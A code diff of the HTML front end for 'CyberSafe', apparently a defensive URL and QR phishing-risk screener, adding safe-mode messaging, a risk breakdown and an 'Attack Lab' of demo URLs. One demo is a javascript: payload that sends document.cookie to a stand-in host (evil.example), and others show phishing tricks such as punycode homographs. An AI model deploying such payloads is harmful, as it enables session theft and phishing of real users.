@@ -44,9 +44,19 @@
         See the destination.<br>
         <span class="text-gradient">Understand the risk.</span> Stay safe.
       </h1>
+      <!-- Phase 7: Accurate hero subtitle -->
       <p class="hero-subtitle">
-        Deterministic, explainable URL & QR risk screening. No network lookups. No auto-navigation. Zero data exfiltration risks.
+        Deterministic, explainable URL &amp; QR risk screening. No destination requests are made during analysis.
       </p>
+      <!-- Phase 7: SAFE ANALYSIS MODE badge -->
+      <div class="safe-mode-banner">
+        <div class="safe-mode-items">
+          <span class="safe-mode-item"><i data-lucide="shield-off"></i> No destination requests</span>
+          <span class="safe-mode-item"><i data-lucide="eye-off"></i> No URL fetching</span>
+          <span class="safe-mode-item"><i data-lucide="wifi-off"></i> No DNS resolution</span>
+          <span class="safe-mode-item"><i data-lucide="lock"></i> Analyzes structure only</span>
+        </div>
+      </div>
     </div>
   </header>
 
@@ -81,7 +91,7 @@
           </div>
           <div class="security-notice">
             <i data-lucide="info"></i>
-            <span>CyberSafe analyzes the syntax without visiting the destination.</span>
+            <span>CyberSafe analyzes the URL structure without visiting the destination. No data is sent to the target.</span>
           </div>
         </form>
 
@@ -96,7 +106,6 @@
         </div>
       </div>
 
-      <!-- Demo Payloads -->
       <!-- Mode selector -->
       <div class="mode-selector">
         <button class="mode-btn active" id="mode-offline-btn" title="Analyze URL structure offline — never contacts destination">
@@ -115,6 +124,7 @@
         <span id="mode-desc-text">Offline mode — analyzes URL structure without contacting the destination.</span>
       </div>
 
+      <!-- Demo Payloads -->
       <div class="demos-container">
         <span class="demos-label">Try a Demo:</span>
         <button class="demo-btn" data-url="https://example.com" data-type="safe">Safe</button>
@@ -126,15 +136,22 @@
       </div>
 
       <!-- State Displays -->
+      <!-- Phase 3: Loading text now says "Analyzing URL structure..." -->
       <div id="loading-state" class="state-container hidden">
         <div class="scanline-loader"></div>
-        <p id="loading-text">Running deterministic security heuristics...</p>
+        <p id="loading-text">Analyzing URL structure...</p>
       </div>
 
+      <!-- Phase 16: Professional error states -->
       <div id="error-state" class="state-container error-container hidden">
         <i data-lucide="alert-triangle" class="error-icon"></i>
         <h3 id="error-title">Analysis Failed</h3>
         <p id="error-message">Could not complete the request.</p>
+        <div class="error-actions">
+          <button class="btn btn-secondary" onclick="document.getElementById('error-state').classList.add('hidden')">
+            Dismiss
+          </button>
+        </div>
       </div>
 
       <!-- Results Container -->
@@ -162,13 +179,31 @@
 
         <!-- Offline Analysis Results -->
         <div id="offline-results">
+
+          <!-- Phase 5: Risk score breakdown -->
+          <div class="glass-card risk-score-card">
+            <div class="card-header">
+              <h3><i data-lucide="bar-chart-2"></i> Risk Score Breakdown</h3>
+              <!-- Phase 12: Export report button -->
+              <button id="export-report-btn" class="btn-text hidden" title="Copy security report to clipboard">
+                <i data-lucide="clipboard-copy"></i> Copy Report
+              </button>
+            </div>
+            <div id="risk-score-breakdown"></div>
+          </div>
+
           <div class="analysis-grid">
+            <!-- Phase 4: URL Anatomy with visual breakdown -->
             <div class="glass-card anatomy-card">
               <div class="card-header">
                 <h3><i data-lucide="microscope"></i> URL Anatomy</h3>
               </div>
+              <!-- Phase 4: Visual URL decomposition -->
+              <div id="anatomy-visual" class="anatomy-visual"></div>
               <div class="anatomy-grid" id="anatomy-grid"></div>
             </div>
+
+            <!-- Phase 6: Explainable findings -->
             <div class="glass-card findings-card">
               <div class="card-header">
                 <h3><i data-lucide="shield-alert"></i> Detection Rules</h3>
@@ -177,23 +212,93 @@
               <div class="findings-list" id="findings-list"></div>
             </div>
           </div>
-          <div class="glass-card security-why-card" style="margin-top:1.5rem">
+
+          <!-- Phase 7: Safe Analysis Mode explanation -->
+          <div class="glass-card safe-analysis-card" style="margin-top:1.5rem">
             <div class="card-header">
-              <h3><i data-lucide="shield-check"></i> Why This Works</h3>
+              <h3><i data-lucide="shield-check"></i> SAFE ANALYSIS MODE</h3>
+              <span class="safe-mode-label">Active</span>
             </div>
-            <div style="font-size:0.9rem;line-height:1.7;color:var(--text-muted)">
-              <p><strong>CyberSafe does not visit the URL.</strong> It analyzes the <em>structure</em> of the URL itself to detect deception patterns.</p>
-              <p style="margin-top:0.5rem"><strong>SAFE does not guarantee the destination is safe.</strong> It means no significant structural indicators were detected.</p>
+            <div class="safe-analysis-grid">
+              <div class="safe-analysis-item">
+                <i data-lucide="check-circle"></i>
+                <div>
+                  <strong>No destination requests</strong>
+                  <p>CyberSafe never fetches, visits, or pings the submitted URL.</p>
+                </div>
+              </div>
+              <div class="safe-analysis-item">
+                <i data-lucide="check-circle"></i>
+                <div>
+                  <strong>Structural analysis only</strong>
+                  <p>The URL string itself is parsed and checked against detection rules.</p>
+                </div>
+              </div>
+              <div class="safe-analysis-item">
+                <i data-lucide="info"></i>
+                <div>
+                  <strong>SAFE ≠ safe destination</strong>
+                  <p>No structural red flags were found. It does not guarantee the linked content is safe.</p>
+                </div>
+              </div>
+              <div class="safe-analysis-item">
+                <i data-lucide="check-circle"></i>
+                <div>
+                  <strong>No data exfiltration</strong>
+                  <p>Your submitted URL is sent only to the CyberSafe analysis API — never to the target.</p>
+                </div>
+              </div>
             </div>
           </div>
         </div>
 
         <!-- Safe Recon Results -->
+        <!-- Phase 8: Structural Analysis label + Network Access panel -->
         <div id="recon-results" class="hidden">
+          <!-- Network Access panel -->
+          <div class="glass-card network-access-card">
+            <div class="card-header">
+              <h3><i data-lucide="wifi"></i> Network Access</h3>
+              <span class="recon-live-badge">Live Recon</span>
+            </div>
+            <div class="network-access-grid">
+              <div class="network-item network-item--used">
+                <i data-lucide="check-circle"></i>
+                <span>DNS Resolution</span>
+                <span class="network-status">Used</span>
+              </div>
+              <div class="network-item network-item--used">
+                <i data-lucide="check-circle"></i>
+                <span>HTTP HEAD / GET</span>
+                <span class="network-status">Used</span>
+              </div>
+              <div class="network-item network-item--used">
+                <i data-lucide="check-circle"></i>
+                <span>TLS Certificate</span>
+                <span class="network-status">Used</span>
+              </div>
+              <div class="network-item network-item--not-used">
+                <i data-lucide="x-circle"></i>
+                <span>Page Content / HTML</span>
+                <span class="network-status">Not used</span>
+              </div>
+              <div class="network-item network-item--not-used">
+                <i data-lucide="x-circle"></i>
+                <span>JavaScript Execution</span>
+                <span class="network-status">Not used</span>
+              </div>
+              <div class="network-item network-item--not-used">
+                <i data-lucide="x-circle"></i>
+                <span>Cookies / Session</span>
+                <span class="network-status">Not used</span>
+              </div>
+            </div>
+          </div>
+
           <!-- Recon Summary -->
           <div class="glass-card recon-summary-card">
             <div class="card-header">
-              <h3><i data-lucide="radar"></i> Recon Summary</h3>
+              <h3><i data-lucide="radar"></i> Structural Analysis</h3>
               <button class="btn-text" id="terminal-toggle-btn">Terminal View</button>
             </div>
             <div class="recon-summary-grid" id="recon-summary-grid"></div>
@@ -230,6 +335,60 @@
         </div>
 
       </div><!-- /results-container -->
+
+      <!-- Phase 9: Attack Lab Section -->
+      <section class="attack-lab-section glass-card" style="margin-top:2rem">
+        <div class="card-header">
+          <h3><i data-lucide="zap"></i> Attack Lab</h3>
+          <span class="attack-lab-badge">Interactive Demos</span>
+        </div>
+        <p class="attack-lab-desc">Click any technique to instantly analyze a real-world example. None of these URLs are visited — only their structure is analyzed.</p>
+        <div class="attack-lab-grid attack-lab-demos">
+          <button class="attack-lab-btn" data-url="https://google.com@evil-phish.net/login" data-type="suspicious">
+            <div class="attack-lab-icon">🎭</div>
+            <div class="attack-lab-info">
+              <strong>Credential @ Trick</strong>
+              <span>Hides real destination after @</span>
+            </div>
+          </button>
+          <button class="attack-lab-btn demo-btn" data-url="https://paypa1-secure.verify.net/account" data-type="suspicious">
+            <div class="attack-lab-icon">🎯</div>
+            <div class="attack-lab-info">
+              <strong>Brand Lookalike</strong>
+              <span>Substituted characters in brand name</span>
+            </div>
+          </button>
+          <button class="attack-lab-btn demo-btn" data-url="javascript:fetch('https://evil.example/steal?c='+document.cookie)" data-type="suspicious">
+            <div class="attack-lab-icon">💉</div>
+            <div class="attack-lab-info">
+              <strong>Script Injection</strong>
+              <span>javascript: scheme payload</span>
+            </div>
+          </button>
+          <button class="attack-lab-btn demo-btn" data-url="https://xn--pple-43d.com/login" data-type="suspicious">
+            <div class="attack-lab-icon">🔤</div>
+            <div class="attack-lab-info">
+              <strong>Punycode Homograph</strong>
+              <span>Unicode lookalike characters</span>
+            </div>
+          </button>
+          <button class="attack-lab-btn demo-btn" data-url="https://tinyurl.com/y7d3xk9p" data-type="review">
+            <div class="attack-lab-icon">🔗</div>
+            <div class="attack-lab-info">
+              <strong>URL Shortener</strong>
+              <span>Hides destination via redirect</span>
+            </div>
+          </button>
+          <button class="attack-lab-btn demo-btn" data-url="http://10.0.0.1/admin/config.php" data-type="review">
+            <div class="attack-lab-icon">🌐</div>
+            <div class="attack-lab-info">
+              <strong>Internal IP Access</strong>
+              <span>Targeting private network range</span>
+            </div>
+          </button>
+        </div>
+      </section>
+
     </section>
 
     <!-- Sidebar / History -->
@@ -238,6 +397,10 @@
         <div class="card-header">
           <h3><i data-lucide="history"></i> Recent Scans</h3>
           <button id="clear-history-btn" class="btn-text" title="Clear History">Clear</button>
+        </div>
+        <!-- Phase 11: History search -->
+        <div class="history-search-wrap">
+          <input type="text" id="history-search" class="history-search" placeholder="Filter history..." autocomplete="off">
         </div>
         <div id="history-list" class="history-list">
           <div class="empty-history" id="empty-history">
